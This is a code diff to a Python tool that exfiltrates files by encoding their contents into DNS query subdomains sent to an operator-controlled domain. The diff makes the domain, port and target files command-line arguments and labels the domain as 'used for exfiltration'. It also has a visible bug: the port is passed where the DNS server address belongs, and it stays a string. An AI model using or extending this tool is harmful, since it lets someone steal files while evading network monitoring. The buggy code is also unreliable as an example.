@@ -1,3 +1,5 @@
+import ipaddress
+import sys
 import math
 import gzip
 import base64
@@ -6,6 +8,7 @@ import socket
 import textwrap
 
 max_subdomain_length = 63
+max_domain_length = 255
 
 
 def make_dns_query_domain(domain):
@@ -26,8 +29,14 @@ def make_dns_request_data(dns_query):
     return req
 
 
-def dns_lookup(domain, dns_server="127.0.0.1"):
+def dns_lookup(domain, dns_server="127.0.0.1", port=53):
     # https://stackoverflow.com/a/60122993
+
+    if len(domain) >= max_domain_length:
+        raise ValueError(
+            "Can not perform a DNS lookup for domains over 255 characters in length"
+        )
+
     dns_query = make_dns_query_domain(domain)
 
     req = make_dns_request_data(dns_query)
@@ -35,7 +44,7 @@ def dns_lookup(domain, dns_server="127.0.0.1"):
     sock.settimeout(10)
 
     try:
-        sock.sendto(req, (dns_server, 53))
+        sock.sendto(req, (dns_server, port))
     except Exception:
         return
     finally:
@@ -114,21 +123,42 @@ def create_request_urls(payload: dict, domain: str) -> list:
     ]
 
 
-def send_requests(requests):
+def send_requests(requests, port):
 
     # Get the OS to make a DNS request for our funny domain. This is
     # preferable because even if we aren't allowed to use a DNS of our
     # choice, the DNS request will make its way back to our server anyways.
 
     for index, request in enumerate(requests):
-        print(f"Sending request {index}/{len(requests)}: {request}")
-        dns_lookup(request)
+        print(f"Sending request {index+1}/{len(requests)}: {request}")
+        dns_lookup(request, port)
+
+
+def usage():
+    """ Displays usage information and description of command-line flags """
+
+    print(f"Usage: python {sys.argv[0]} [domain] [port] [file1.txt,file2.txt]\n")
+    print("Options:")
+    print("-h\tThis help menu\n")
 
 
 if __name__ == "__main__":
-    filename = "secret_file.txt"
-    domain = "example.com"
 
-    payload = construct_data_payload([filename])
+    if len(sys.argv) != 4:
+        usage()
+        sys.exit(1)
+    elif sys.argv[1] == "-h":
+        usage()
+        sys.exit(1)
+
+    domain = sys.argv[1]
+    port = sys.argv[2]
+    filenames = sys.argv[3].split(",")
+
+    if not domain:
+        usage()
+        sys.exit("Must provide the domain used for exfiltration")
+
+    payload = construct_data_payload(filenames)
     requests = create_request_urls(payload, domain)
-    send_requests(requests)
+    send_requests(requests, port)
